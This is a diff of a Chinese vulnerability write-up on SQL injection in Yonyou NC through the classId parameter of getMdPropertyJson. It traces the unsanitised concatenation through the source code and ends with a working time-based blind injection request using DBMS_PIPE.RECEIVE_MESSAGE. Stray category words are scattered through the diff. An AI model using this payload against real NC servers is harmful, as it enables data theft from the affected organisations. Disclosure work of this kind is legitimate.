@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 [用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用 /portal/pt/oauidesigner/getMdPropertyJson 接口中的 classId 参数实现sql注入，从而窃取服务器的敏感信息。
 
-商务软件和生产力软件
+企业资源规划
 
 # 影响版本
 
@@ -29,6 +29,14 @@ NC65
 黑客与破解
 
 nc/bs/oa/oaff/uidesigner/action/TemplatedesignerAction.class
+
+深入探索
+
+字典与百科全书
+
+软件
+
+博客资源与服务
 
 ```
 package nc.bs.oa.oaff.uidesigner.action;
@@ -109,7 +117,7 @@ public void getMdPropertyJson() throws BusinessException {
 
 classId 参数直接拼接在SQL语句后，代入 getPropertyVOByCondition 函数，其实现逻辑如下
 
-计算机科学
+工程与技术
 
 ```
 public PropertyVO[] getPropertyVOByCondition(String condition) throws CpbBusinessException {
@@ -158,7 +166,7 @@ public SuperVO[] queryByCondition(Class voClass, String strWhere) throws DAOExce
 
 strWhere 直接拼接到 and SQL语句后 代入 retrieveByClause 函数
 
-社会科学
+编程
 
 继续跟踪 retrieveByClause 函数
 
@@ -184,8 +192,6 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 # 漏洞复现
 
 > 只是示例
->
-> 编程
 
 ```
 GET /portal/pt/oauidesigner/getMdPropertyJson?pageId=login&mdIdMap=1&classId=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',4)-- HTTP/1.1
